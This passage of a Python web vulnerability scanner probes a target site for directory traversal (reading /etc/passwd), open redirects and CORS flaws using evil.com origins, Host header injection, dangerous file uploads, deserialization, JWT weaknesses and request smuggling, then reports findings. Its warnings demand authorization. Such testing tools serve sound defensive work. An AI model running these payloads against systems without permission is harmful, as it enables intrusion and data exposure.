            '..%c0%af..%c0%af..%c0%afetc%c0%afpasswd',
            '/var/www/../../etc/passwd',
            'C:\\..\\..\\..\\windows\\win.ini',
        ]
        
        # Common vulnerable parameters
        file_params = ['file', 'path', 'document', 'page', 'include',
                      'template', 'dir', 'locate', 'show', 'view']
        
        for param in file_params:
            for payload in traversal_payloads:
                url = f"{self.target_url}?{param}={quote(payload)}"
                response = self.make_request('GET', url)
                
                if response and self._check_directory_traversal(response):
                    self.add_finding('HIGH', 'Directory Traversal',
                                   'Path Traversal Vulnerability',
                                   f'Parameter {param} allows directory traversal',
                                   {'parameter': param, 'payload': payload})

    def _check_directory_traversal(self, response: requests.Response) -> bool:
        """Check for successful directory traversal"""
        indicators = [
            'root:x:0:0:',  # /etc/passwd
            '[fonts]',  # win.ini
            'extension=',  # php.ini
            'Program Files',
            '/usr/bin',
        ]
        
        return any(indicator in response.text for indicator in indicators)

    def test_open_redirect(self):
        """Test for open redirect vulnerabilities"""
        self.log("Testing open redirect vulnerabilities...")
        
        redirect_payloads = [
            'http://evil.com',
            'https://evil.com',
            '//evil.com',
            '/\\evil.com',
            'http://evil.com%2f%2e%2e',
            'http://google.com',
            '/@evil.com',
            'http://evil.com?',
        ]
        
        redirect_params = ['url', 'uri', 'redirect', 'return', 'returnTo',
                          'goto', 'next', 'target', 'dest', 'destination',
                          'continue', 'site', 'view', 'out']
        
        for param in redirect_params:
            for payload in redirect_payloads:
                url = f"{self.target_url}?{param}={quote(payload)}"
                response = self.make_request('GET', url, allow_redirects=False)
                
                if response and response.status_code in [301, 302, 303, 307, 308]:
                    location = response.headers.get('Location', '')
                    if 'evil.com' in location or 'google.com' in location:
                        self.add_finding('MEDIUM', 'Open Redirect',
                                       'Open Redirect Vulnerability',
                                       f'Parameter {param} allows open redirects',
                                       {'parameter': param, 'payload': payload,
                                        'redirect_to': location})

    def test_cors_misconfiguration(self):
        """Test for CORS misconfiguration"""
        self.log("Testing CORS configuration...")
        
        origins = [
            'http://evil.com',
            'https://evil.com',
            'null',
            'http://localhost',
            f'http://{self.domain}.evil.com',
        ]
        
        for origin in origins:
            headers = {'Origin': origin}
            response = self.make_request('GET', self.target_url, headers=headers)
            
            if response:
                acao = response.headers.get('Access-Control-Allow-Origin', '')
                acac = response.headers.get('Access-Control-Allow-Credentials', '')
                
                if acao == origin or acao == '*':
                    severity = 'HIGH' if acac == 'true' else 'MEDIUM'
                    self.add_finding(severity, 'CORS', 'CORS Misconfiguration',
                                   f'Server reflects arbitrary origins in CORS headers',
                                   {'origin': origin, 'acao': acao, 'credentials': acac})

    def test_http_methods(self):
        """Test for dangerous HTTP methods"""
        self.log("Testing HTTP methods...")
        
        methods = ['GET', 'POST', 'PUT', 'DELETE', 'OPTIONS', 'TRACE', 
                  'CONNECT', 'PATCH', 'HEAD']
        
        allowed_methods = []
        
        for method in methods:
            response = self.make_request(method, self.target_url)
            if response and response.status_code != 405:
                allowed_methods.append(method)
                
                if method in ['PUT', 'DELETE']:
                    self.add_finding('HIGH', 'HTTP Methods',
                                   f'Dangerous HTTP Method: {method}',
                                   f'Server allows potentially dangerous {method} method',
                                   {'method': method, 'status_code': response.status_code})
                elif method == 'TRACE':
                    self.add_finding('MEDIUM', 'HTTP Methods',
                                   'TRACE Method Enabled',
                                   'Server allows TRACE method (XST vulnerability)',
                                   {'method': method})
        
        # Check OPTIONS response
        response = self.make_request('OPTIONS', self.target_url)
        if response and 'Allow' in response.headers:
            self.add_finding('INFO', 'HTTP Methods', 'Allowed Methods',
                           f'Server advertises methods: {response.headers["Allow"]}',
                           {'methods': response.headers['Allow']})

    def test_insecure_deserialization(self):
        """Test for insecure deserialization vulnerabilities"""
        self.log("Testing insecure deserialization...")
        
        # Java serialization payload (harmless)
        java_payload = base64.b64encode(b'\xac\xed\x00\x05').decode()
        
        # PHP serialization payload (harmless)
        php_payload = 'O:8:"stdClass":0:{}'
        
        # Python pickle payload (harmless)
        python_payload = base64.b64encode(b'\x80\x03}q\x00.').decode()
        
        # .NET serialization
        dotnet_payload = 'AAEAAAD/////AQAAAAAAAAAMAgAAAF...'
        
        # Test common parameters
        params = ['data', 'object', 'payload', 'serialize', 'session', 'state']
        
        for param in params:
            # Test each serialization format
            payloads = {
                'Java': java_payload,
                'PHP': php_payload,
                'Python': python_payload,
                '.NET': dotnet_payload
            }
            
            for format_name, payload in payloads.items():
                url = f"{self.target_url}?{param}={quote(payload)}"
                response = self.make_request('GET', url)
                
                if response and self._check_deserialization_errors(response, format_name):
                    self.add_finding('HIGH', 'Deserialization',
                                   f'Potential {format_name} Deserialization',
                                   f'Parameter {param} may process {format_name} serialized data',
                                   {'parameter': param, 'format': format_name})

    def _check_deserialization_errors(self, response: requests.Response, format_name: str) -> bool:
        """Check for deserialization error indicators"""
        error_patterns = {
            'Java': ['java.io.ObjectInputStream', 'java.lang.ClassCastException'],
            'PHP': ['unserialize()', 'Notice: unserialize'],
            'Python': ['pickle.loads', '_pickle.UnpicklingError'],
            '.NET': ['System.Runtime.Serialization', 'BinaryFormatter']
        }
        
        patterns = error_patterns.get(format_name, [])
        return any(pattern in response.text for pattern in patterns)

    def test_jwt_vulnerabilities(self):
        """Test for JWT vulnerabilities"""
        self.log("Testing JWT vulnerabilities...")
        
        # Check for JWTs in cookies and headers
        response = self.make_request('GET', self.target_url)
        if not response:
            return
            
        # Look for JWT in cookies
        for cookie in response.cookies:
            if self._is_jwt(cookie.value):
                self._analyze_jwt(cookie.value, f'Cookie: {cookie.name}')
        
        # Look for JWT in response headers
        auth_header = response.headers.get('Authorization', '')
        if 'Bearer ' in auth_header:
            token = auth_header.split('Bearer ')[-1]
            if self._is_jwt(token):
                self._analyze_jwt(token, 'Authorization Header')

    def _is_jwt(self, token: str) -> bool:
        """Check if string is a JWT"""
        parts = token.split('.')
        return len(parts) == 3 and all(part for part in parts)

    def _analyze_jwt(self, token: str, location: str):
        """Analyze JWT for vulnerabilities"""
        try:
            # Decode without verification
            header = jwt.get_unverified_header(token)
            payload = jwt.decode(token, options={"verify_signature": False})
            
            # Check for 'none' algorithm
            if header.get('alg', '').lower() == 'none':
                self.add_finding('CRITICAL', 'JWT', 'JWT None Algorithm',
                               f'JWT at {location} uses "none" algorithm',
                               {'location': location, 'header': header})
            
            # Check for weak algorithms
            weak_algs = ['HS256', 'HS384', 'HS512']
            if header.get('alg') in weak_algs:
                self.add_finding('MEDIUM', 'JWT', 'JWT Weak Algorithm',
                               f'JWT uses symmetric algorithm {header.get("alg")}',
                               {'location': location, 'algorithm': header.get('alg')})
            
            # Check for sensitive data in payload
            sensitive_keys = ['password', 'secret', 'api_key', 'private']
            for key in sensitive_keys:
                if key in str(payload).lower():
                    self.add_finding('HIGH', 'JWT', 'Sensitive Data in JWT',
                                   f'JWT contains potentially sensitive data',
                                   {'location': location, 'key': key})
            
        except Exception as e:
            self.log(f"Error analyzing JWT: {str(e)}", 'ERROR')

    def test_api_endpoints(self):
        """Discover and test API endpoints"""
        self.log("Discovering API endpoints...")
        
        # Common API paths
        api_paths = [
            '/api/', '/api/v1/', '/api/v2/', '/v1/', '/v2/',
            '/graphql', '/api/graphql',
            '/rest/', '/services/', '/ws/',
            '/api/docs', '/api/swagger', '/swagger.json',
            '/api-docs', '/api/help', '/api/console'
        ]
        
        found_apis = []
        
        for path in api_paths:
            url = urljoin(self.target_url, path)
            response = self.make_request('GET', url)
            
            if response and response.status_code in [200, 401, 403]:
                found_apis.append({
                    'path': path,
                    'status': response.status_code,
                    'content_type': response.headers.get('Content-Type', '')
                })
                
                # Check for GraphQL
                if 'graphql' in path.lower():
                    self._test_graphql_introspection(url)
                
                # Check for Swagger/OpenAPI
                if 'swagger' in path.lower() or 'api-docs' in path.lower():
                    self.add_finding('INFO', 'API', 'API Documentation Exposed',
                                   f'API documentation found at {path}',
                                   {'path': path})
        
        if found_apis:
            self.add_finding('INFO', 'API', 'API Endpoints Discovered',
                           f'Found {len(found_apis)} API endpoints',
                           {'endpoints': found_apis})

    def _test_graphql_introspection(self, url: str):
        """Test GraphQL introspection"""
        introspection_query = {
            "query": """
            {
                __schema {
                    types {
                        name
                        fields {
                            name
                        }
                    }
                }
            }
            """
        }
        
        response = self.make_request('POST', url,
                                   json=introspection_query,
                                   headers={'Content-Type': 'application/json'})
        
        if response and '__schema' in response.text:
            self.add_finding('MEDIUM', 'GraphQL', 'GraphQL Introspection Enabled',
                           'GraphQL endpoint allows introspection queries',
                           {'url': url})

    def test_file_upload(self):
        """Test for file upload vulnerabilities"""
        self.log("Testing file upload vulnerabilities...")
        
        # Find file upload forms
        response = self.make_request('GET', self.target_url)
        if not response:
            return
            
        forms = self._extract_forms(response.text)
        
        for form in forms:
            if any('file' in input_name.lower() for input_name in form['inputs']):
                self._test_file_upload_form(form)

    def _test_file_upload_form(self, form: Dict):
        """Test a specific file upload form"""
        # Test file types
        test_files = [
            ('test.php', '<?php echo "test"; ?>', 'application/x-php'),
            ('test.jsp', '<% out.println("test"); %>', 'application/x-jsp'),
            ('test.aspx', '<%@ Page Language="C#" %>', 'application/x-aspx'),
            ('test.html', '<script>alert(1)</script>', 'text/html'),
            ('test.svg', '<svg onload="alert(1)">', 'image/svg+xml'),
        ]
        
        url = urljoin(self.target_url, form['action'])
        
        for filename, content, content_type in test_files:
            files = {'file': (filename, content, content_type)}
            response = self.make_request('POST', url, files=files)
            
            if response and response.status_code == 200:
                self.add_finding('HIGH', 'File Upload',
                               'Potentially Dangerous File Upload',
                               f'Form accepts {filename} files',
                               {'form': form['action'], 'file_type': filename})

    def test_rate_limiting(self):
        """Test for rate limiting"""
        self.log("Testing rate limiting...")
        
        # Make rapid requests
        start_time = time.time()
        responses = []
        
        for i in range(20):
            response = self.make_request('GET', self.target_url)
            if response:
                responses.append({
                    'status': response.status_code,
                    'time': time.time() - start_time
                })
        
        # Check if rate limiting is in place
        rate_limited = any(r['status'] == 429 for r in responses)
        
        if not rate_limited and len(responses) == 20:
            self.add_finding('MEDIUM', 'Rate Limiting', 'No Rate Limiting',
                           'Application does not implement rate limiting',
                           {'requests_made': len(responses),
                            'time_taken': responses[-1]['time']})

    def test_session_management(self):
        """Test session management security"""
        self.log("Testing session management...")
        
        # Get initial session
        response1 = self.make_request('GET', self.target_url)
        if not response1:
            return
            
        session_cookies = {name: cookie for name, cookie in response1.cookies.items()
                          if 'session' in name.lower() or 'sess' in name.lower()}
        
        if session_cookies:
            # Test session fixation
            fixed_session = 'fixated_session_id_123'
            for cookie_name in session_cookies:
                cookies = {cookie_name: fixed_session}
                response2 = self.make_request('GET', self.target_url, cookies=cookies)
                
                if response2 and cookie_name in response2.cookies:
                    if response2.cookies[cookie_name] == fixed_session:
                        self.add_finding('HIGH', 'Session', 'Session Fixation',
                                       'Application accepts user-supplied session IDs',
                                       {'cookie': cookie_name})
            
            # Test session randomness
            sessions = []
            for _ in range(5):
                response = self.make_request('GET', self.target_url)
                if response:
                    for name, cookie in response.cookies.items():
                        if name in session_cookies:
                            sessions.append(cookie.value)
            
            if len(set(sessions)) < len(sessions):
                self.add_finding('MEDIUM', 'Session', 'Weak Session Generation',
                               'Session IDs may not be sufficiently random',
                               {'sample_sessions': sessions[:3]})

    def test_clickjacking(self):
        """Test for clickjacking vulnerabilities"""
        self.log("Testing clickjacking protection...")
        
        response = self.make_request('GET', self.target_url)
        if not response:
            return
            
        # Check X-Frame-Options
        x_frame = response.headers.get('X-Frame-Options', '').upper()
        csp_frame = response.headers.get('Content-Security-Policy', '')
        
        protected = False
        
        if x_frame in ['DENY', 'SAMEORIGIN']:
            protected = True
        elif "frame-ancestors 'none'" in csp_frame or "frame-ancestors 'self'" in csp_frame:
            protected = True
        
        if not protected:
            # Additional check: look for framebuster scripts
            if 'top.location' not in response.text and 'frameElement' not in response.text:
                self.add_finding('MEDIUM', 'Clickjacking', 'Missing Clickjacking Protection',
                               'Page can be embedded in frames (clickjacking risk)',
                               {'x_frame_options': x_frame or 'Not Set',
                                'csp_frame_ancestors': 'Not Set'})

    def test_host_header_injection(self):
        """Test for host header injection"""
        self.log("Testing host header injection...")
        
        malicious_hosts = [
            'evil.com',
            f'{self.domain}.evil.com',
            'localhost',
            '127.0.0.1',
            f'{self.domain}@evil.com'
        ]
        
        for host in malicious_hosts:
            headers = {'Host': host}
            response = self.make_request('GET', self.target_url, headers=headers)
            
            if response:
                # Check if host is reflected in response
                if host in response.text or host in str(response.headers):
                    self.add_finding('MEDIUM', 'Host Header', 'Host Header Injection',
                                   f'Application reflects host header: {host}',
                                   {'host': host})
                
                # Check for password reset poisoning
                if 'password' in response.text.lower() and 'reset' in response.text.lower():
                    if host in response.text:
                        self.add_finding('HIGH', 'Host Header', 
                                       'Password Reset Poisoning',
                                       'Host header injection in password reset functionality',
                                       {'host': host})

    def test_http_request_smuggling(self):
        """Test for HTTP request smuggling"""
        if not self.aggressive:
            self.log("Skipping request smuggling test (requires --aggressive)")
            return
            
        self.log("Testing HTTP request smuggling...")
        
        # CL.TE smuggling attempt
        smuggle_cl_te = (
            f"POST / HTTP/1.1\r\n"
            f"Host: {self.domain}\r\n"
            f"Content-Length: 13\r\n"
            f"Transfer-Encoding: chunked\r\n"
            f"\r\n"
            f"0\r\n"
            f"\r\n"
            f"SMUGGLED"
        )
        
        # TE.CL smuggling attempt
        smuggle_te_cl = (
            f"POST / HTTP/1.1\r\n"
            f"Host: {self.domain}\r\n"
            f"Transfer-Encoding: chunked\r\n"
            f"Content-Length: 4\r\n"
            f"\r\n"
            f"25\r\n"
            f"SMUGGLED REQUEST\r\n"
            f"0\r\n"
            f"\r\n"
        )
        
        # Note: Actual request smuggling testing requires raw socket connections
        # This is a simplified detection method
        self.add_finding('INFO', 'Request Smuggling', 
                       'Request Smuggling Test Limitation',
                       'Full request smuggling test requires manual verification',
                       {'note': 'Use specialized tools for comprehensive testing'})

    def _extract_forms(self, html: str) -> List[Dict]:
        """Enhanced form extraction"""
        forms = []
        form_pattern = re.compile(r'<form[^>]*>(.*?)</form>', re.DOTALL | re.IGNORECASE)
        
        for match in form_pattern.finditer(html):
            form_html = match.group(0)
            
            # Extract form attributes
            action_match = re.search(r'action=["\']([^"\']*)["\']', form_html)
            method_match = re.search(r'method=["\']([^"\']*)["\']', form_html)
            
            # Extract all inputs (including hidden)
            inputs = re.findall(r'<input[^>]*name=["\']([^"\']*)["\'][^>]*>', form_html)
            
            # Extract textareas
            textareas = re.findall(r'<textarea[^>]*name=["\']([^"\']*)["\'][^>]*>', form_html)
            
            # Extract selects
            selects = re.findall(r'<select[^>]*name=["\']([^"\']*)["\'][^>]*>', form_html)
            
            forms.append({
                'action': action_match.group(1) if action_match else '/',
                'method': method_match.group(1).upper() if method_match else 'GET',
                'inputs': inputs + textareas + selects
            })
        
        return forms

    def _find_xml_endpoints(self) -> List[str]:
        """Find potential XML endpoints"""
        xml_paths = [
            '/api/xml', '/xml', '/soap', '/wsdl',
            '/services', '/ws', '/api/v1/xml'
        ]
        
        endpoints = []
        for path in xml_paths:
            url = urljoin(self.target_url, path)
            response = self.make_request('GET', url)
            
            if response and response.status_code != 404:
                content_type = response.headers.get('Content-Type', '').lower()
                if 'xml' in content_type or 'soap' in content_type:
                    endpoints.append(url)
        
        return endpoints

    def _test_xss_in_form(self, form: Dict, payload: str, category: str) -> bool:
        """Enhanced XSS testing in forms"""
        try:
            url = urljoin(self.target_url, form['action'])
            
            # Test each input individually
            for input_name in form['inputs']:
                data = {name: 'test' for name in form['inputs']}
                data[input_name] = payload
                
                if form['method'] == 'POST':
                    response = self.make_request('POST', url, data=data)
                else:
                    response = self.make_request('GET', url, params=data)
                
                if response:
                    # Check for unencoded payload
                    if payload in response.text:
                        return True
                    
                    # Check for partially encoded payload
                    if category == 'encoded':
                        decoded_payload = unquote(payload)
                        if decoded_payload in response.text:
                            return True
        except Exception as e:
            self.log(f"Error testing XSS: {str(e)}", 'ERROR')
        
        return False

    def run_all_tests(self):
        """Run all security tests"""
        print(f"\n{'='*70}")
        print(f"🔒 ADVANCED SECURITY TESTING: {self.target_url}")
        print(f"{'='*70}")
        print("⚠️  Remember: Only test systems you own or have permission to test!")
        print(f"{'='*70}\n")
        
        # Phase 1: Reconnaissance
        print("\n[Phase 1: Reconnaissance & Fingerprinting]")
        print("-" * 50)
        reconnaissance_tests = [
            self.test_technology_fingerprinting,
            self.test_subdomain_enumeration,
        ]
        
        for test in reconnaissance_tests:
            try:
                test()
            except Exception as e:
                self.log(f"Error in {test.__name__}: {str(e)}", 'ERROR')
        
        # Phase 2: Configuration & Infrastructure
        print("\n[Phase 2: Configuration & Infrastructure Tests]")
        print("-" * 50)
        config_tests = [
            self.test_ssl_tls,
            self.test_security_headers,
            self.test_cors_misconfiguration,
            self.test_http_methods,
            self.test_host_header_injection,
        ]
        
        for test in config_tests:
            try:
                test()
            except Exception as e:
                self.log(f"Error in {test.__name__}: {str(e)}", 'ERROR')
        
        # Phase 3: Input Validation
        print("\n[Phase 3: Input Validation & Injection Tests]")
        print("-" * 50)
        injection_tests = [
            self.test_advanced_xss,
            self.test_advanced_sql_injection,
            self.test_xxe_injection,
            self.test_command_injection,
            self.test_directory_traversal,
            self.test_ssrf,
        ]
        
        for test in injection_tests:
            try:
                test()
            except Exception as e:
                self.log(f"Error in {test.__name__}: {str(e)}", 'ERROR')
        
        # Phase 4: Application Logic
        print("\n[Phase 4: Application Logic & Business Tests]")
        print("-" * 50)
        logic_tests = [
            self.test_open_redirect,
            self.test_file_upload,
            self.test_insecure_deserialization,
            self.test_jwt_vulnerabilities,
            self.test_api_endpoints,
        ]
        
        for test in logic_tests:
            try:
                test()
            except Exception as e:
                self.log(f"Error in {test.__name__}: {str(e)}", 'ERROR')
        
        # Phase 5: Session & Access Control
        print("\n[Phase 5: Session & Access Control Tests]")
        print("-" * 50)
        session_tests = [
            self.test_session_management,
            self.test_csrf_protection,
            self.test_cookie_security,
            self.test_clickjacking,
            self.test_rate_limiting,
        ]
        
        for test in session_tests:
            try:
                test()
            except Exception as e:
                self.log(f"Error in {test.__name__}: {str(e)}", 'ERROR')
        
        # Phase 6: Advanced Tests
        if self.aggressive:
            print("\n[Phase 6: Advanced/Aggressive Tests]")
            print("-" * 50)
            advanced_tests = [
                self.test_http_request_smuggling,
                self.test_common_paths,
            ]
            
            for test in advanced_tests:
                try:
                    test()
                except Exception as e:
                    self.log(f"Error in {test.__name__}: {str(e)}", 'ERROR')
        
        return self.results

    def print_results(self):
        """Print detailed test results with statistics"""
        print(f"\n{'='*70}")
        print("📊 SECURITY ASSESSMENT RESULTS")
        print(f"{'='*70}\n")
        
        # Summary statistics
        critical_count = sum(1 for v in self.results['vulnerabilities'] if v['severity'] == 'CRITICAL')
        high_count = sum(1 for v in self.results['vulnerabilities'] if v['severity'] == 'HIGH')
        medium_count = len(self.results['warnings'])
        low_count = len(self.results['info'])
        
        print("📈 Summary Statistics:")
        print(f"   Total Requests Made: {self.request_count}")
        print(f"   Critical Issues: {critical_count}")
        print(f"   High Issues: {high_count}")
        print(f"   Medium Issues: {medium_count}")
        print(f"   Low/Info Issues: {low_count}")
        print(f"   Technologies Detected: {len(self.results['technologies'])}")
        print(f"   Subdomains Found: {len(self.results['subdomains'])}")
        print()
        
        # Critical vulnerabilities
        critical_vulns = [v for v in self.results['vulnerabilities'] if v['severity'] == 'CRITICAL']
        if critical_vulns:
            print(f"🚨 CRITICAL VULNERABILITIES ({len(critical_vulns)})")
            print("=" * 60)
            for vuln in critical_vulns:
                print(f"\n⚡ {vuln['title']}")
                print(f"   Category: {vuln['category']}")
                print(f"   Description: {vuln['description']}")
                if vuln.get('details'):
                    print(f"   Details: {json.dumps(vuln['details'], indent=6)}")
        
        # High severity
        high_vulns = [v for v in self.results['vulnerabilities'] if v['severity'] == 'HIGH']
        if high_vulns:
            print(f"\n🔴 HIGH SEVERITY ISSUES ({len(high_vulns)})")
            print("=" * 60)
            for vuln in high_vulns:
                print(f"\n• {vuln['title']}")
                print(f"  Category: {vuln['category']}")
                print(f"  {vuln['description']}")
                if self.verbose and vuln.get('details'):
                    print(f"  Details: {json.dumps(vuln['details'], indent=4)}")
        
        # Medium severity
        if self.results['warnings']:
            print(f"\n🟡 MEDIUM SEVERITY ISSUES ({len(self.results['warnings'])})")
            print("=" * 60)
            for warn in self.results['warnings']:
                print(f"\n• {warn['title']}")
                print(f"  Category: {warn['category']}")
                print(f"  {warn['description']}")
        
        # Low severity/Info
        if self.results['info'] and self.verbose:
            print(f"\n🔵 LOW SEVERITY/INFO ({len(self.results['info'])})")
            print("=" * 60)
            for info in self.results['info']:
                print(f"• {info['title']}: {info['description']}")
        
        # Technologies
        if self.results['technologies']:
            print(f"\n🔧 DETECTED TECHNOLOGIES")
            print("=" * 60)
            for tech in self.results['technologies']:
                print(f"  • {tech}")
        
        # Risk assessment
        print(f"\n⚖️  RISK ASSESSMENT")
        print("=" * 60)
        
        if critical_count > 0:
            print("🚨 CRITICAL RISK: Immediate action required!")
        elif high_count > 0:
            print("🔴 HIGH RISK: Significant vulnerabilities found")
        elif medium_count > 0:
            print("🟡 MEDIUM RISK: Important issues to address")
        else:
            print("🟢 LOW RISK: Only minor issues found")
        
        print(f"\nScan completed at: {self.results['scan_time']}")
        print(f"Total scan duration: {datetime.now() - datetime.fromisoformat(self.results['scan_time'])}")

    def save_results(self, filename: str):
        """Save results to JSON file"""
        # Add metadata
        self.results['metadata'] = {
            'scanner_version': '2.0',
            'aggressive_mode': self.aggressive,
            'total_requests': self.request_count,
            'scan_duration': str(datetime.now() - datetime.fromisoformat(self.results['scan_time']))
        }
        
        with open(filename, 'w') as f:
            json.dump(self.results, f, indent=2)
        print(f"\n💾 Results saved to: {filename}")

    def generate_report(self, format: str = 'html'):
        """Generate a formatted security report"""
        if format == 'html':
            html_report = f"""
<!DOCTYPE html>
<html>
<head>
    <title>Security Assessment Report - {self.target_url}</title>
    <style>
        body {{ font-family: Arial, sans-serif; margin: 20px; }}
        .critical {{ color: #d32f2f; }}
        .high {{ color: #f44336; }}
        .medium {{ color: #ff9800; }}
        .low {{ color: #2196f3; }}
        .info {{ color: #607d8b; }}
        table {{ border-collapse: collapse; width: 100%; }}
        th, td {{ border: 1px solid #ddd; padding: 8px; text-align: left; }}
        th {{ background-color: #f2f2f2; }}
    </style>
</head>
<body>
    <h1>Security Assessment Report</h1>
    <p><strong>Target:</strong> {self.target_url}</p>
    <p><strong>Scan Date:</strong> {self.results['scan_time']}</p>
    
    <h2>Summary</h2>
    <table>
        <tr>
            <th>Severity</th>
            <th>Count</th>
        </tr>
        <tr class="critical">
            <td>Critical</td>
            <td>{sum(1 for v in self.results['vulnerabilities'] if v['severity'] == 'CRITICAL')}</td>
        </tr>
        <tr class="high">
            <td>High</td>
            <td>{sum(1 for v in self.results['vulnerabilities'] if v['severity'] == 'HIGH')}</td>
        </tr>
        <tr class="medium">
            <td>Medium</td>
            <td>{len(self.results['warnings'])}</td>
        </tr>
        <tr class="low">
            <td>Low/Info</td>
            <td>{len(self.results['info'])}</td>
        </tr>
    </table>
    
    <h2>Detailed Findings</h2>
    <!-- Add detailed findings here -->
    
</body>
</html>
"""
            
            report_filename = f"security_report_{self.domain}_{datetime.now().strftime('%Y%m%d_%H%M%S')}.html"
            with open(report_filename, 'w') as f:
                f.write(html_report)
            print(f"\n📄 HTML report generated: {report_filename}")


def print_banner():
    """Print tool banner"""
    banner = """
╔══════════════════════════════════════════════════════════════════════╗
║                  ADVANCED SECURITY INTEGRATION TESTER                 ║
║                              Version 2.0                              ║
║                                                                      ║
║  ⚠️  CRITICAL WARNING:                                                ║
║  This tool is for AUTHORIZED SECURITY TESTING ONLY!                 ║
║                                                                      ║
║  Using this tool without explicit written permission is ILLEGAL      ║
║  and may result in severe legal consequences including:             ║
║  • Criminal prosecution                                              ║
║  • Civil lawsuits                                                    ║
║  • Significant fines                                                 ║
║  • Imprisonment                                                      ║
║                                                                      ║
║  ONLY test systems you own or have written authorization to test.   ║
║                                                                      ║
║  By using this tool, you acknowledge that you:                      ║
║  1. Have explicit permission to test the target system              ║
║  2. Understand the legal implications of unauthorized testing       ║
║  3. Accept full responsibility for your actions                     ║
╚══════════════════════════════════════════════════════════════════════╝
    """
    print(banner)


def main():
    print_banner()
    
    parser = argparse.ArgumentParser(
        description='Advanced Website Security Integration Testing Tool',
        formatter_class=argparse.RawDescriptionHelpFormatter
    )
    
    parser.add_argument('url', help='Target URL to test')
    parser.add_argument('-v', '--verbose', action='store_true', 
                       help='Enable verbose output')
    parser.add_argument('-a', '--aggressive', action='store_true',
                       help='Enable aggressive testing (more requests, deeper scanning)')
    parser.add_argument('-o', '--output', help='Save results to JSON file')
    parser.add_argument('-r', '--report', action='store_true',
                       help='Generate HTML report')
    parser.add_argument('--threads', type=int, default=10,
                       help='Number of concurrent threads (default: 10)')
    parser.add_argument('--timeout', type=int, default=10,
                       help='Request timeout in seconds (default: 10)')
    parser.add_argument('--confirm', action='store_true',
                       help='Confirm you have permission to test this website')
    
    args = parser.parse_args()
    
    if not args.confirm:
        print("\n❌ ERROR: You must confirm you have permission to test this website.")
        print("   Add --confirm flag to acknowledge you have authorization.")
        print("\n⚖️  Remember: Unauthorized security testing is ILLEGAL!")
        sys.exit(1)
    
    # Validate URL
    if not args.url.startswith(('http://', 'https://')):
        args.url = 'https://' + args.url
    
    # Additional confirmation for aggressive mode
    if args.aggressive:
        print("\n⚠️  AGGRESSIVE MODE ENABLED")
        print("This will generate significantly more traffic and may trigger security alerts.")
        response = input("Are you SURE you want to continue? (yes/no): ")
        if response.lower() != 'yes':
            print("Scan cancelled.")
            sys.exit(0)
    
    try:
        # Check if required libraries are installed
        required_libs = ['dns']
        missing_libs = []
        
        for lib in required_libs:
            try:
                __import__(lib)
            except ImportError:
                missing_libs.append(lib)
        
        if missing_libs:
            print(f"\n⚠️  Missing required libraries: {', '.join(missing_libs)}")
            print("Install with: pip install dnspython")
            print("Note: Some advanced features may be limited without these libraries.")
        
        # Run the security tests
        tester = AdvancedSecurityTester(args.url, 
                                       verbose=args.verbose,
                                       aggressive=args.aggressive)
        results = tester.run_all_tests()
        tester.print_results()
        
        if args.output:
            tester.save_results(args.output)
        
        if args.report:
            tester.generate_report()
            
    except KeyboardInterrupt:
        print("\n\n⚠️  Scan interrupted by user")
        sys.exit(0)
    except Exception as e:
        print(f"\n❌ Error: {str(e)}")
        if args.verbose:
            import traceback
            traceback.print_exc()
        sys.exit(1)


if __name__ == "__main__":
    main()